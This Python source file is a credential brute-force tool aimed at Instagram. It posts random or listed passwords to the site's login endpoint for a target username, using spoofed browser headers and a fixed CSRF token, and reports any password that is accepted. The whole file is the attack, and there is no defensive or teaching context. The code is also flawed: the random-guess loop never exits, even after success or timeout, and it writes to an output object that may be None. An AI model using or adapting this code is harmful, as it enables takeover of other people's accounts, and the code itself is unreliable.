import requests
import random
import time

def instabrute(username, min_pass_length, max_pass_length, timeout, output=None):
    start_time = time.time()
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'x-csrftoken': 'jxwzFbtrRyNfzMDkJWnG8lNjKzS11GJd',
        'x-requested-with': 'XMLHttpRequest',
        'referer': 'https://www.instagram.com/accounts/login/',
    }
    
    while True:
        password = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(random.randint(min_pass_length, max_pass_length)))
        data = {
            'username': username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
        }
        response = requests.post(url, headers=headers, data=data)
        if 'authenticated":true' in response.text:
            output.appendPlainText(password)
        elif time.time() > start_time + timeout:
            output.appendPlainText('Timeout reached. Could not find correct password.')
        else:
            time.sleep(1)


def instabrute_passlist(username, password_list, timeout, output=None):
    start_time = time.time()
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'x-csrftoken': 'jxwzFbtrRyNfzMDkJWnG8lNjKzS11GJd',
        'x-requested-with': 'XMLHttpRequest',
        'referer': 'https://www.instagram.com/accounts/login/',
    }
    
    for password in password_list:
        data = {
            'username': username,
            'password': password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
        }
        response = requests.post(url, headers=headers, data=data)
        if 'authenticated":true' in response.text:
            if output:
                output.appendPlainText(f"Found password: {password}")
            else:
                print(f"Found password: {password}")
            return password
        elif time.time() > start_time + timeout:
            if output:
                output.appendPlainText('Timeout reached. Could not find correct password.')
            else:
                print("Timeout reached. Could not find correct password.")
            return None
        else:
            time.sleep(1)
